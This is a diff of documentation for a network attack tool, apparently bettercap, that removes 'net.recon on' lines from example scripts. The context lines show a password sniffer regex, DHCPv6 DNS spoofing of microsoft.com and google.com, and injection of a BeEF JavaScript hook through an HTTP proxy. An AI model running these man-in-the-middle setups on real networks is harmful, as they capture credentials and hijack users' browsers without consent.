@@ -135,8 +135,6 @@ Interactive sessions can be scripted with `.cap` files, or `caplets`, the follow
 Simple password sniffer.
 
 ```sh
-# keep reading arp table for network mapping
-net.recon on
 # setup a regular expression for packet payloads
 set net.sniff.regexp .*password=.+
 # set the sniffer output file
@@ -158,8 +156,6 @@ set dhcp6.spoof.domains microsoft.com, google.com
 # let's give em some contents
 set http.server.path caplets/www
 
-# check who's alive on the network
-net.recon on
 # serve files
 http.server on
 # redirect DNS request by spoofing DHCPv6 packets
@@ -190,7 +186,6 @@ set api.rest.password bcap
 
 # actively probe network for new hosts
 net.probe on
-net.recon on
 
 # enjoy /api/session and /api/events
 api.rest on
@@ -269,8 +264,6 @@ Use a proxy script to inject a BEEF javascript hook:
 
 # inject beef hook
 set http.proxy.script caplets/beef-inject.js
-# keep reading arp table for network mapping
-net.recon on
 # redirect http traffic to a proxy
 http.proxy on
 # wait for everything to start properly
